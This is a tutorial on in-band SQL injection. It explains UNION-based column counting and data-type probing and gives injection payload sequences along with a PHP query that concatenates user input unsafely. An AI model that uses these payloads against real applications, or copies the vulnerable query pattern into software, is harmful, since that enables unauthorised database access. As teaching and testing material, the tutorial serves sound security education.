# In-band SQLi

The best way to exploit in-band sqli is with the UNION command. However, there are some important things you need to take in account:

* The field types of the second SELECT must match the ones in the first statemement.
* The number of fields in the second SELECT must match the first statement.
* To successfully perform the attack, we need to understand the structure of the database \(tables and columns\).

To solve the first two issues, lets enumerate the number of columns/fields a query selects:

```text
mysql_query("SELECT id, real_name FROM users WHERE id=".$GET['id'].";");
```

The columns and data types are:

* id has data type int
* real\_name has data type varchar \(string\)

In this case, for the second SELECT statement using UNION, if we select more than 2 columns or if the number is correct but the data type is different it will not work and will try to throw an error:

MySQL:

```text
The used SELECT statement have a different number of columns
```

MS SQL:

```text
All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target list.
```

PostgreSQL:

```text
Each UNION query must have the same number of columns.
```

Oracle:

```text
ORA-01789: query block has incorrect number of result columns.
```

Detecting the number of fields needed to exploit an in-band SQL injection looks like:

```text
> 9999 UNION SELECT NULL; ---
> 9999 UNION SELECT NULL, NULL; ---
> 9999 UNION SELECT NULL, NULL, NULL; ---
> 9999 UNION SELECT NULL, NULL, NULL, NULL; ---

Another example:

> 1111' UNION SELECT NULL; -- -
> 1111' UNION SELECT NULL, NULL; -- -
> 1111' UNION SELECT NULL, NULL, NULL; -- -
> 1111' UNION SELECT NULL, NULL, NULL, NULL; -- -
```

Other way to enumerate fields is to use ORDER BY:

```text
> search=Tom' ORDER BY 1-- -
> search=Tom' ORDER BY 2-- -
> search=Tom' ORDER BY 3-- -
> search=Tom' ORDER BY 4-- -
> search=Tom' ORDER BY 5-- -
> search=Tom' ORDER BY 6-- -
```

For the query to work, the number of NULL fields must match, so we can just keep adding it until the app doesn't throw an error anymore, as the two statements finally will be balanced \(with the same number of fields in both SELECT statements\).

This can be used even when the application does not throw an error when the query is wrong. Generally it will not display anything or the page will be messed up, so you can keep adding NULL to the query til it works.

Now, to discover the datatype of each field, we can simply repeat the same exercise since most DBMS won't allow UNION based queries if the datatype are different, therefore:

```text
> SELECT 1 UNION 'a';
```

Won't work and will trigger an error.

| DBMS | Datatype enforcing |
| :--- | :--- |
| MySQL | No |
| MSSQL | Yes |
| ORACLE | Yes |
| PostgreSQL | Yes |

Now, we:

* Substitute one of the null fields with a constant.
* If the constant type is correct, the query will work
* If the type is wrong, the webapp will throw an error or misbehave

So after finding the number of fields, we change the datatypes:

```text
> 1111' UNION SELECT NULL, NULL; -- -
#Change first field to int
> 1111' UNION SELECT 1, NULL; -- -
#If no errors, change the second field to int
> 1111' UNION SELECT 1, 1; -- -
#If errors, change the second field to string
> 1111' UNION SELECT 1, 'a'; -- -
```

